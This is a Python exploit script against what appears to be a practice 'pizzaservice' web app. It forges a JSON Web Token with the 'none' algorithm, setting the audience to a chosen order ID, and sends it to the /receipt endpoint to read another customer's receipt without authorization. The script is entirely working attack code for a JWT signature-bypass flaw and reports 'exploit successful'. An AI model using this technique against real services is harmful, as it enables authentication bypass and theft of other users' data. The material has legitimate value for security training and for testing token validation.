#!/usr/bin/python3

import jwt
import http.client
from sys import argv, exit

def usage():
    print("{} orderid server=127.0.0.1 port=7777".format(argv[0]))
    exit(1)

if len(argv) not in (2,3,4):
    usage()

exploit_orderid = argv[1]

if len(argv) > 2:
    addr = argv[2]
else: addr = "localhost"

if len(argv) == 4:
    try:
        port = int(argv[3])
    except:
        print("invalid port")
        usage()
else: port = 7777

# prepare token with alg: none
print("[*] create malicious token:")
token = jwt.encode(algorithm=None, payload={"aud": exploit_orderid, "iss": "pizzaservice v0.1"}, key="")
print(jwt.get_unverified_header(token))
print(jwt.decode(token, verify=False))

print("[*] GET receipt data from order_id ", exploit_orderid)
conn = http.client.HTTPConnection(addr, port=port)
header = {"Authorization" : "Bearer "+str(token, "ascii")}
try:
    conn.request("GET", "/receipt?order_id="+exploit_orderid, headers=header)
    with conn.getresponse() as res:
        if res.status == 200:
            print("[*] recieved data from order_id "+exploit_orderid+":")
            print("-------------------------")
            print(str(res.read(), 'utf8'))
            print("-------------------------")
            print("exploit successful")
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)